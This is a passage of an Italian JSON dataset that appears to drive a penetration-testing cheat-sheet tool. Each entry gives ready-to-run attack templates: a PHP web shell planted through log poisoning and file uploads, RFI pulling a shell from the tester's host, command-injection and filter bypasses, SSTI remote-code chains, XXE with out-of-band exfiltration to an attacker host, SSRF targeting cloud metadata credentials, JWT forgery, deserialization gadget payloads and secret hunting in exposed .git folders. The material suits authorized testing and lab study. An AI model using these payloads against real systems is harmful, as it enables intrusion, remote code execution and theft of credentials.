    "description": "Inietta codice PHP in un log, tramite `User-Agent` oppure come username su `auth.log`, per poi includerlo via LFI ed eseguirlo.\n- Apache: `/var/log/apache2/access.log`\n- Nginx: `/var/log/nginx/access.log`.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "lfi",
      "log-poisoning",
      "rce"
    ],
    "template": "# avvelena il log del web server scrivendo il payload nello User-Agent\ncurl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/\n\n# include il log via LFI: il PHP dentro viene eseguito\nhttp://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id",
    "variants": [
      {
        "id": "default",
        "label": "1. Inietta nel log",
        "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/",
        "description": "Il payload PHP entra nel log di access come valore dello User-Agent. La richiesta serve solo a scrivere nel log, quindi la risposta HTTP è irrilevante."
      },
      {
        "id": "trigger",
        "label": "2. Includi ed esegui",
        "template": "curl \"http://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id\"",
        "description": "Includendo il log via LFI, il PHP iniettato viene eseguito e il parametro `cmd` ne controlla il comando. Il percorso del log cambia fra Apache e Nginx e deve essere leggibile dal processo web."
      }
    ],
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "note": "# Prerequisiti\nDevi poter leggere il file di log via LFI (path noto e permessi di lettura) e scriverci dentro, per esempio tramite header `User-Agent` o come username in `auth.log`.\n# Output atteso\nIncludendo il log avvelenato, il PHP iniettato esegue e il comando torna nella risposta.\n# Errori comuni\nLog non leggibili per permessi, rotazione che cancella il payload, o caratteri che rompono il PHP: tienilo minimale (`<?php system($_GET['c']);?>`)."
  },
  {
    "id": "rfi",
    "name": "RFI — remote file inclusion",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Inclusion",
    "description": "Se `allow_url_include` è attivo, includi una shell PHP ospitata da te. Serve un web server in ascolto (es. `python3 -m http.server 80`).",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "rfi",
      "php",
      "rce"
    ],
    "template": "http://<ip>/page?file=http://<lhost>/shell.php",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      }
    ],
    "note": "# Prerequisiti\nRichiede `allow_url_include=On` (raro nelle installazioni moderne) e un web server tuo in ascolto che serva la shell PHP.\n# Errori comuni\nQuasi sempre `allow_url_include` è disattivato: in quel caso ripiega su LFI con i wrapper PHP o con il log poisoning.\n# Prossimo passo\nLa shell remota inclusa esegue nel contesto del web server: ricevi la connessione e stabilizza."
  },
  {
    "id": "file-upload",
    "name": "File Upload — bypass",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "File Upload",
    "description": "Carica una web shell aggirando i controlli: estensione alternativa, Content-Type falso, magic bytes immagine, doppia estensione.",
    "note": "# Quale bypass provare\nI controlli si aggirano a strati, dal più debole al più robusto:\n- Estensione: alternative (.phtml, .php5, .phar), doppia estensione, maiuscole\n- Content-Type: falsifichi l’header (es. image/png) se il server si fida di quello\n- Magic bytes: anteponi la firma di un’immagine (GIF89a) al codice\n- Contenuto: combini i precedenti quando c’è validazione reale del file\n# Prossimo passo\nTrovata l’estensione eseguibile accettata, carichi una web shell minimale e passi alla fase Exploitation. Liste estensioni e bypass su PayloadsAllTheThings.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "file-upload",
      "webshell",
      "rce"
    ],
    "template": "<?php system($_GET['cmd']); ?>",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Web shell PHP",
        "template": "<?php system($_GET['cmd']); ?>",
        "description": "Shell PHP minimale; poi richiama `?cmd=id`. Per IIS usa `ASPX`, per Tomcat `JSP`."
      },
      {
        "id": "ext",
        "label": "Bypass estensione",
        "template": "shell.phtml / shell.php5 / shell.pHp / shell.php%00.jpg",
        "description": "Estensioni alternative che il server esegue comunque come PHP."
      },
      {
        "id": "magic",
        "label": "Bypass magic bytes",
        "template": "GIF89a;\n<?php system($_GET['cmd']); ?>",
        "description": "Prefisso `GIF89a` per passare i controlli che leggono i primi byte."
      },
      {
        "id": "ctype",
        "label": "Bypass Content-Type",
        "template": "Content-Type: image/jpeg",
        "description": "In Burp cambia l’header mantenendo il contenuto PHP."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — File Upload",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html"
      }
    ]
  },
  {
    "id": "cmdi",
    "name": "Command Injection",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "Command Injection",
    "description": "Concatena un comando al parametro vulnerabile. Se c’è un filtro, prova i bypass (quote interne, `${IFS}` al posto degli spazi).",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "command-injection",
      "rce"
    ],
    "template": "; whoami",
    "params": [],
    "variants": [
      {
        "id": "default",
        "label": "Operatori",
        "template": "; whoami",
        "description": "Altri separatori da provare: | whoami · || whoami · & whoami · && whoami · $(whoami) · `whoami`."
      },
      {
        "id": "quote",
        "label": "Bypass con quote",
        "template": "w'h'o'a'm'i",
        "description": "Le quote vuote vengono rimosse dalla shell: aggira i filtri su parole chiave."
      },
      {
        "id": "ifs",
        "label": "Bypass spazi ($IFS)",
        "template": "cat${IFS}/etc/passwd",
        "description": "`${IFS}` o `$IFS` sostituiscono lo spazio quando è filtrato."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — Command Injection",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/command-injection.html"
      }
    ],
    "note": "# Output atteso\nL'output del comando iniettato compare nella risposta. Se non c'è output (blind), conferma con un ritardo (`; sleep 5`) o con un callback OOB (DNS/HTTP verso il tuo host).\n# Opzioni utili\nSeparatori: `;`, `|`, `&&`, backtick, `$(...)`. Contro i filtri: `${IFS}` al posto degli spazi, quote interne (`w'h'oami`), concatenazione o encoding.\n# Prossimo passo\nConfermata la RCE con `id` o `whoami`, lancia una reverse shell e stabilizza."
  },
  {
    "id": "ssti-detect",
    "name": "SSTI — detection & engine",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SSTI",
    "description": "Individua una Server-Side Template Injection e riconosce il motore. Si inietta prima un'espressione matematica come `{{7*7}}` o `${7*7}` in ogni campo riflesso: se compare `49` il template valuta l'input. Un polyglot unico prova più sintassi in un colpo, poi si distingue l'engine (Jinja2, Twig, Freemarker...) con payload che si comportano diversamente.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "ssti",
      "template-injection",
      "web"
    ],
    "template": "curl -gs 'http://<ip>/?<param>=${{<%[%27%22}}%25\\'",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "param",
        "label": "Parametro",
        "placeholder": "name"
      }
    ],
    "variants": [
      {
        "id": "detect",
        "label": "Detection (polyglot)",
        "template": "# incolla nel campo riflesso; se qualcosa va in errore o valuta, c'è SSTI\n${{<%[%'\"}}%\\",
        "description": "Polyglot che rompe o valuta su Jinja2, Twig, Freemarker, Smarty e altri. Una risposta anomala (errore di template o output valutato) segnala il punto iniettabile."
      },
      {
        "id": "math",
        "label": "Math check",
        "template": "# in ciascun campo, uno alla volta:\n{{7*7}}\n${7*7}\n<%= 7*7 %>\n#{7*7}",
        "description": "Se la risposta contiene `49` il valore è stato valutato lato server. La sintassi che funziona restringe già il motore."
      },
      {
        "id": "identify",
        "label": "Identifica engine",
        "template": "{{7*'7'}}   # Jinja2 => 7777777 | Twig => 49\n${7*7}      # Freemarker/Java\n*{7*7}      # Thymeleaf\n{system('id')} # Smarty",
        "description": "Payload che distinguono i motori: `{{7*'7'}}` dà 7777777 in Jinja2 e 49 in Twig. Identificato il motore, scegli l'RCE giusta."
      }
    ],
    "refs": [
      {
        "label": "PayloadsAllTheThings — SSTI",
        "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection"
      }
    ],
    "note": "# Output atteso\nSe `{{7*7}}` (o `${7*7}`) torna `49`, il template valuta l'input: è vulnerabile. Se resta letterale, no. Il motore si distingue incrociando i marcatori: `{{ }}` Jinja2/Twig, `${ }` FreeMarker, `#{ }` Ruby/Thymeleaf, `<%= %>` ERB.\n# Prossimo passo\nIdentificato il motore, passa al payload di RCE specifico (vedi SSTI — RCE per engine)."
  },
  {
    "id": "ssti-rce",
    "name": "SSTI — RCE per engine",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SSTI",
    "description": "Una volta identificato il motore di template, il payload giusto esegue comandi di sistema con i privilegi del web server. Ogni engine ha la sua catena: Jinja2 risale ai globals di Python, Twig registra `system` come filtro, Freemarker usa la utility Execute. `tplmap` automatizza detection e sfruttamento quando il payload manuale non basta.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "ssti",
      "rce",
      "web"
    ],
    "template": "{{ cycler.__init__.__globals__.os.popen('<cmd>').read() }}",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      },
      {
        "key": "param",
        "label": "Parametro",
        "placeholder": "name"
      },
      {
        "key": "cmd",
        "label": "Comando",
        "placeholder": "id"
      }
    ],
    "variants": [
      {
        "id": "jinja2",
        "label": "Jinja2 (Python)",
        "template": "{{ cycler.__init__.__globals__.os.popen('<cmd>').read() }}",
        "description": "Risale da un oggetto builtin ai globals di Python e chiama `os.popen`. Alternativa classica: `{{ config.__class__.__init__.__globals__['os'].popen('<cmd>').read() }}`."
      },
      {
        "id": "twig",
        "label": "Twig (PHP)",
        "template": "{{ ['<cmd>']|filter('system') }}",
        "description": "Usa il filtro `system` sul comando. Su versioni vecchie: `{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('<cmd>')}}`."
      },
      {
        "id": "freemarker",
        "label": "Freemarker (Java)",
        "template": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"<cmd>\") }",
        "description": "Istanzia la utility Execute di Freemarker ed esegue il comando lato JVM."
      },
      {
        "id": "smarty",
        "label": "Smarty (PHP)",
        "template": "{system('<cmd>')}",
        "description": "Smarty espone direttamente `system`. Se filtrato, prova `{php}system('<cmd>');{/php}` sulle versioni datate."
      },
      {
        "id": "tplmap",
        "label": "tplmap (automatico)",
        "template": "tplmap -u 'http://<ip>/?<param>=*' --os-cmd '<cmd>'",
        "description": "Rileva il motore e sfrutta l'SSTI in automatico. Il `*` marca il punto di iniezione. Alternativa moderna: SSTImap."
      }
    ],
    "note": "# Prerequisiti\nIl motore di template va identificato prima (vedi SSTI — detection): ogni engine ha la sua catena per arrivare all'esecuzione.\n# Errori comuni\nAlcuni template girano in sandbox (per esempio Jinja2): serve il bypass tramite la catena di oggetti (`__class__`, `__mro__`, `__subclasses__`). Filtri su parole come `popen` o `os` si aggirano con concatenazione o attributi.\n# Prossimo passo\nConfermata la RCE con `id`, promuovi a reverse shell e stabilizza."
  },
  {
    "id": "xxe",
    "name": "XXE — XML External Entity",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "XXE",
    "description": "Definisce un'entità esterna per leggere file o esfiltrare dati. CDATA serve per i file con caratteri speciali, mentre la variante blind OOB copre i casi in cui l'output non torna nella risposta.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "xxe",
      "xml"
    ],
    "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<xxe-root>&xxe;</xxe-root>",
    "params": [
      {
        "key": "lhost",
        "label": "Tuo host",
        "placeholder": "10.10.14.5"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Basic (file read)",
        "template": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<xxe-root>&xxe;</xxe-root>",
        "description": "Legge `/etc/passwd` se l’app riflette il valore dell’entità in risposta."
      },
      {
        "id": "blind",
        "label": "Blind OOB",
        "template": "<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n]>\n<xxe-root>&send;</xxe-root>",
        "description": "`xxe.dtd` ospitato da te: `<!ENTITY send SYSTEM \"http://<lhost>/?data=%file;\">`, esfiltra via HTTP quando l’output non è mostrato."
      },
      {
        "id": "error",
        "label": "Error-based",
        "template": "<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n  <!ENTITY % dtd SYSTEM \"http://<lhost>/xxe.dtd\">\n  %dtd;\n]>",
        "description": "Il dtd remoto usa un’entità non valida per far comparire il contenuto del file nel messaggio d’errore."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — XXE",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html"
      }
    ],
    "note": "# Output atteso\nIl contenuto del file richiesto compare nella risposta (in-band). Se la risposta non riflette l'entità (blind), usa la variante OOB: un'entità esterna che richiama un DTD sul tuo host ed esfiltra i dati.\n# Prerequisiti\nIl parser XML deve risolvere le entità esterne (DTD non disabilitati). CDATA serve per i file con caratteri speciali.\n# Prossimo passo\nLeggi config e chiavi; su PHP valuta `php://filter` per i sorgenti; l'entità può anche puntare a servizi interni (SSRF)."
  },
  {
    "id": "ssrf",
    "name": "SSRF — Server-Side Request Forgery",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "SSRF",
    "description": "Fa partire la richiesta dal server, così da raggiungere servizi interni o l'endpoint metadata cloud. In presenza di un filtro si ricorre a rappresentazioni alternative dell'indirizzo IP.",
    "note": "# Prossimo passo\nConfermato l’SSRF: punta a 127.0.0.1 e alle porte interne per mappare servizi non esposti, o al metadata endpoint cloud (169.254.169.254) per credenziali IAM. Contro i filtri usa rappresentazioni alternative dell’IP (decimale, ottale, IPv6) o un redirect. Bypass su PayloadsAllTheThings.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "ssrf"
    ],
    "template": "http://<ip>/fetch?url=http://127.0.0.1:8080",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Servizio interno",
        "template": "http://<ip>/fetch?url=http://127.0.0.1:8080",
        "description": "Accedi a un servizio in ascolto solo su localhost."
      },
      {
        "id": "cloud",
        "label": "Cloud metadata",
        "template": "http://<ip>/fetch?url=http://169.254.169.254/latest/meta-data/",
        "description": "Endpoint metadata AWS: spesso espone credenziali IAM temporanee."
      },
      {
        "id": "bypass",
        "label": "Bypass filtro",
        "template": "http://127.1/  ·  http://0x7f000001/  ·  http://[::1]/",
        "description": "Rappresentazioni alternative di 127.0.0.1 per aggirare le blacklist."
      }
    ],
    "refs": [
      {
        "label": "HackTricks — SSRF",
        "url": "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html"
      }
    ]
  },
  {
    "id": "verb-tampering",
    "name": "HTTP Verb Tampering",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "Access Control",
    "description": "Se GET su un’area protetta è bloccato, prova altri metodi: a volte l’autenticazione copre solo GET/POST e PUT/PATCH passano.",
    "note": "# Cosa osservare\nL’autenticazione copre spesso solo GET/POST: prova HEAD, PUT, PATCH, DELETE o un metodo inventato. Se un verbo diverso risponde 200 o esegue l’azione, il controllo è legato al metodo e lo aggiri. Verifica anche l’header X-HTTP-Method-Override.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "verb-tampering",
      "access-control"
    ],
    "template": "curl -X PUT http://<ip>/admin/",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "PUT",
        "template": "curl -X PUT http://<ip>/admin/",
        "description": "Metodo alternativo non coperto dall’ACL."
      },
      {
        "id": "patch",
        "label": "PATCH",
        "template": "curl -X PATCH http://<ip>/admin/",
        "description": "Altro verbo da provare."
      },
      {
        "id": "options",
        "label": "OPTIONS",
        "template": "curl -i -X OPTIONS http://<ip>/admin/",
        "description": "Mostra i metodi permessi nell’header Allow."
      }
    ]
  },
  {
    "id": "idor",
    "name": "IDOR — object reference",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "Access Control",
    "description": "Modifica un identificatore nella request per accedere a risorse di altri utenti. Gli ID sequenziali si cercano in URL, parametri e body.",
    "note": "# Prossimo passo\nCambia l’identificatore (URL, parametro, body, cookie) per leggere risorse altrui. Gli ID sequenziali si fuzzano con Burp Intruder; UUID o hash apparentemente casuali vanno pescati altrove (risposte precedenti, endpoint di listing). Prova anche a cambiare metodo e Content-Type.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "idor",
      "access-control"
    ],
    "template": "GET /api/user/2   (originale: /api/user/1)",
    "params": []
  },
  {
    "id": "jwt-attacks",
    "name": "JWT — manipolazione token",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "JWT",
    "description": "Un JSON Web Token è firmato ma leggibile: si decodifica in base64 per vedere claim e algoritmo, poi si attacca la firma. `alg:none` prova a farsi accettare un token senza firma, il brute force cerca il segreto HS256 debole, la confusion RS256, HS256 rifirma il token con la chiave pubblica del server usata come segreto HMAC.",
    "note": "# Quale variante usare\n- alg:none: azzeri l’algoritmo e togli la firma, passa se il server non la valida\n- Confusione RS256/HS256: firmi con la chiave pubblica usata come segreto HMAC\n- Brute force: se HS256 con segreto debole, lo cracki (hashcat 16500) e rifirmi\nDecodifica sempre prima header e payload (base64url) per vedere alg e claim. jwt_tool automatizza i check.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "jwt",
      "token",
      "web"
    ],
    "template": "jwt_tool <jwt>",
    "params": [
      {
        "key": "jwt",
        "label": "Token JWT",
        "placeholder": "eyJ..."
      },
      {
        "key": "wordlist",
        "label": "Wordlist",
        "placeholder": "/usr/share/wordlists/rockyou.txt"
      }
    ],
    "variants": [
      {
        "id": "decode",
        "label": "Decodifica",
        "template": "# decodifica header e payload del token\njwt_tool <jwt>\n\n# stessa decodifica a mano, senza jwt_tool\necho '<jwt>' | cut -d. -f1,2 | tr '.' '\\n' | base64 -d 2>/dev/null",
        "description": "Mostra header e payload in chiaro. Guarda `alg`, i claim di ruolo/utente e la scadenza per capire cosa manomettere."
      },
      {
        "id": "none",
        "label": "alg:none",
        "template": "jwt_tool <jwt> -X a",
        "description": "Forgia una variante con `alg:none` e firma vuota. Se il server la accetta, puoi impostare qualsiasi claim (es. `admin:true`)."
      },
      {
        "id": "brute",
        "label": "Brute secret HS256",
        "template": "# bruteforce del segreto HMAC con jwt_tool\njwt_tool <jwt> -C -d <wordlist>\n\n# stesso bruteforce con hashcat, più veloce su GPU\nhashcat -m 16500 <jwt> <wordlist>",
        "description": "Cerca il segreto HMAC con un dizionario. Trovato il segreto, si rifirma il token con qualsiasi claim."
      },
      {
        "id": "confusion",
        "label": "RS256, HS256",
        "template": "jwt_tool <jwt> -X k -pk public.pem",
        "description": "Confusion di algoritmo: rifirma il token in HS256 usando la chiave pubblica RSA del server come segreto. Serve avere `public.pem` (spesso su `/jwks.json` o estraibile)."
      }
    ]
  },
  {
    "id": "deserialization",
    "name": "Insecure Deserialization — gadget",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "Deserialization",
    "description": "Quando un'app deserializza dati controllati dall'utente si può forgiare un oggetto che, ricostruito, esegue codice. Ogni stack ha il suo generatore di gadget chain: ysoserial per Java, phpggc per PHP, ysoserial.net per il ViewState.NET, un payload pickle per Python. Riconosci la tecnologia dai token (`rO0` = Java base64, `Tzo...` = PHP `O:`).",
    "note": "# Quale variante usare\nIl generatore di gadget dipende dallo stack: ysoserial (Java), phpggc (PHP), ysoserial.net (.NET). Riconosci prima il formato dai magic bytes (rO0 o AC ED = Java, O: = PHP serializzato). Il gadget utilizzabile dipende dalle librerie presenti: provane più d’uno. Gadget e payload su PayloadsAllTheThings.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "deserialization",
      "ysoserial",
      "rce"
    ],
    "template": "java -jar ysoserial.jar CommonsCollections5 '<cmd>' | base64 -w0",
    "params": [
      {
        "key": "cmd",
        "label": "Comando",
        "placeholder": "id"
      }
    ],
    "variants": [
      {
        "id": "java",
        "label": "Java (ysoserial)",
        "template": "java -jar ysoserial.jar CommonsCollections5 '<cmd>' | base64 -w0",
        "description": "Genera una gadget chain Java. Prova le catene una a una (CommonsCollections1-7, CommonsBeanutils1) in base alle librerie presenti. Token Java serializzato base64 = inizia con `rO0`."
      },
      {
        "id": "php",
        "label": "PHP (phpggc)",
        "template": "phpggc -u Monolog/RCE1 system '<cmd>'",
        "description": "Genera un payload PHP serializzato per una gadget chain nota (qui Monolog). `-l` elenca tutte le catene disponibili per il framework in uso."
      },
      {
        "id": "net",
        "label": ".NET (ysoserial.net)",
        "template": "ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c '<cmd>'",
        "description": "Genera payload.NET, tipico per ViewState di ASP.NET o formatter Json.Net/BinaryFormatter. Per il ViewState serve anche la machineKey."
      },
      {
        "id": "python",
        "label": "Python (pickle)",
        "template": "python3 -c \"import pickle,os,base64;print(base64.b64encode(pickle.dumps(type('E',(object,),{'__reduce__':lambda s:(os.system,('<cmd>',))})())).decode())\"",
        "description": "Costruisce un pickle malevolo che esegue il comando alla deserializzazione. Applicabile a endpoint che fanno `pickle.loads` su input non fidato."
      }
    ]
  },
  {
    "id": "graphql-enum",
    "name": "GraphQL — introspection & abuse",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "GraphQL",
    "description": "Un endpoint GraphQL espone spesso l'intero schema tramite l'introspection query: da lì si scoprono tutti i tipi, i campi e le mutation disponibili, comprese quelle non pensate per l'utente. Se l'introspection è disabilitata, `graphw00f` ne fa il fingerprint e `clairvoyance` ricostruisce lo schema a forza di query.",
    "note": "# Prossimo passo\nL’introspection query rivela schema, tipi e mutation nascoste: da lì cerchi query non autorizzate e mutation sensibili. Se l’introspection è disabilitata, prova a indovinare i campi o ricostruisci lo schema con clairvoyance. graphw00f per il fingerprinting dell’engine.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "graphql",
      "introspection",
      "web"
    ],
    "template": "curl -s -X POST http://<ip>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "introspection",
        "label": "Introspection",
        "template": "curl -s -X POST http://<ip>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'",
        "description": "Dumpa lo schema completo. Cerca tipi come `User` e mutation come `login`/`register` per capire la superficie d'attacco. Formatta l'output con `| jq`."
      },
      {
        "id": "query",
        "label": "Query dati",
        "template": "curl -s -X POST http://<ip>/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{users{id username password email}}\"}'",
        "description": "Interroga direttamente i campi scoperti. Molte API GraphQL espongono più dati del previsto perché l'autorizzazione è per-campo e spesso incompleta."
      },
      {
        "id": "fingerprint",
        "label": "Fingerprint (introspection off)",
        "template": "graphw00f -d -t http://<ip>/graphql",
        "description": "Identifica l'implementazione GraphQL anche con introspection disabilitata. Poi `clairvoyance` può ricostruire lo schema a forza di suggerimenti d'errore."
      }
    ]
  },
  {
    "id": "git-dumper",
    "name": ".git esposto — dump sorgenti",
    "category": "vuln-analysis",
    "subcategory": "web-app-testing",
    "group": "Source Leak",
    "description": "Una cartella `.git` lasciata nel web root permette di ricostruire l'intero codice sorgente dell'applicazione, inclusi i segreti committati per errore. Prima si verifica l'esposizione, poi `git-dumper` scarica e ricostruisce il repository, infine si scava nella history dei commit dove finiscono password e chiavi API poi rimosse.",
    "note": "# Prossimo passo\nConferma l’esposizione (richiedi /.git/HEAD o /.git/config), poi git-dumper ricostruisce il repo. Nei sorgenti cerca credenziali, chiavi API e logica di auth; git log e git show sui commit vecchi rivelano spesso segreti rimossi di recente. Stesso approccio per .svn e .hg esposti.",
    "platform": "cross-platform",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "git",
      "source-leak",
      "secrets"
    ],
    "template": "git-dumper http://<ip>/.git/ ./loot-git",
    "params": [
      {
        "key": "ip",
        "label": "IP",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "check",
        "label": "Check esposizione",
        "template": "# verifica se la cartella .git è esposta\ncurl -s http://<ip>/.git/HEAD\n\n# legge la config del repo: remote e branch\ncurl -s http://<ip>/.git/config",
        "description": "Una risposta con `ref: refs/heads/...` conferma che la `.git` è servita e scaricabile. Vale la pena controllare anche `.svn/`, `.hg/` e i backup `.bak`/`.zip`."
      },
      {
        "id": "dump",
        "label": "Dump repository",
        "template": "git-dumper http://<ip>/.git/ ./loot-git",
        "description": "Scarica e ricostruisce il repo in `./loot-git`. Se git-dumper manca: `pip install git-dumper` (o gitdumper.sh di GitTools)."
      },
      {
        "id": "secrets",
        "label": "Cerca segreti nella history",
        "template": "# storico completo dei commit del repo scaricato\ncd ./loot-git && git log --oneline --all\n\n# cerca credenziali e token nelle diff di tutti i commit\ngit log -p --all | grep -iE 'password|passwd|secret|api[_-]?key|token'",
        "description": "Scorre tutti i commit: le credenziali spesso vengono committate e poi 'rimosse', ma restano nella history. `git show <commit>` apre uno specifico cambiamento."
      }
    ]
  },
  {
    "id": "searchsploit",
    "name": "searchsploit — exploit noti",
    "category": "vuln-analysis",
    "subcategory": "infrastructure",
    "group": "Exploit Search",
    "description": "Cerca exploit pubblici per servizio e versione esatta. Il codice del PoC va sempre letto prima di lanciarlo.\n- `-x` = apre il PoC per la lettura\n- `-m` = copia il PoC nella cartella corrente",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [],
    "tags": [
      "searchsploit",
      "exploit-db",
      "cve"
    ],
    "template": "searchsploit <service> <version>",
    "params": [
      {
        "key": "service",
        "label": "Servizio",
        "placeholder": "apache"
      },
      {
        "key": "version",
        "label": "Versione",
        "placeholder": "2.4.49"
      },
      {
        "key": "path",
        "label": "Path exploit",
        "placeholder": "php/webapps/50001.php"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Cerca",
        "template": "searchsploit <service> <version>",
        "description": "Cerca per nome servizio e versione."
      },
      {
        "id": "examine",
        "label": "Leggi (-x)",
        "template": "searchsploit -x <path>",
        "description": "Apre il PoC per leggerne il codice."
      },
      {
        "id": "mirror",
        "label": "Copia (-m)",
        "template": "searchsploit -m <path>",
        "description": "Copia il PoC nella cartella corrente."
      }
    ],
    "note": "# Logica CVE\n- Identifica la versione esatta del servizio (`nmap -sV`, banner, pagina `/about`)\n- `searchsploit <service> <version>`\n- Cerca su Google/GitHub: `<service> <version> CVE PoC exploit`\n- Leggi il codice del PoC prima di eseguirlo: capisci cosa fa\n- Adatta i parametri (IP, porta, path) e lancia",
    "refs": [
      {
        "label": "Exploit-DB — SearchSploit",
        "url": "https://www.exploit-db.com/searchsploit"
      }
    ]
  },
  {
    "id": "nuclei",
    "name": "nuclei — scanner a template",
    "category": "vuln-analysis",
    "subcategory": "infrastructure",
    "group": "Scanners",
    "description": "Scanner basato su template per CVE e misconfiguration note.\n- `-tags cve` = limita ai template dei CVE\n- `-o` = salva sempre l'output su file",
    "note": "# Quale variante usare\nAggiorna i template (nuclei -ut) prima di lanciarlo. -tags cve oppure -severity high,critical riducono rumore e falsi positivi. Dagli in pasto la lista di host viva da httpx. Conferma sempre a mano ogni finding prima di dichiararlo valido.",
    "platform": "linux",
    "requires": [
      "no-creds"
    ],
    "protocols": [
      "http"
    ],
    "tags": [
      "nuclei",
      "scanner",
      "cve"
    ],
    "template": "nuclei -u http://<ip> -o nuclei.txt",
    "params": [
      {
        "key": "ip",
        "label": "Target",
        "ctx": "ip",
        "placeholder": "10.10.10.11"
      }
    ],
    "variants": [
      {
        "id": "default",
        "label": "Full",
        "template": "nuclei -u http://<ip> -o nuclei.txt",
        "description": "Tutti i template applicabili."
      },
      {
        "id": "cve",
        "label": "Solo CVE",
        "template": "nuclei -u http://<ip> -tags cve -o nuclei_cve.txt",
        "description": "Limita ai template taggati cve."
      }
    ]
  },
  {
    "id": "nikto",
    "name": "nikto — web vuln scan",
    "category": "vuln-analysis",
    "subcategory": "infrastructure",
    "group": "Scanners",
    "description": "Scanner web veloce per file pericolosi, header e misconfiguration. È rumoroso, quindi adatto solo quando lo stealth non conta.",
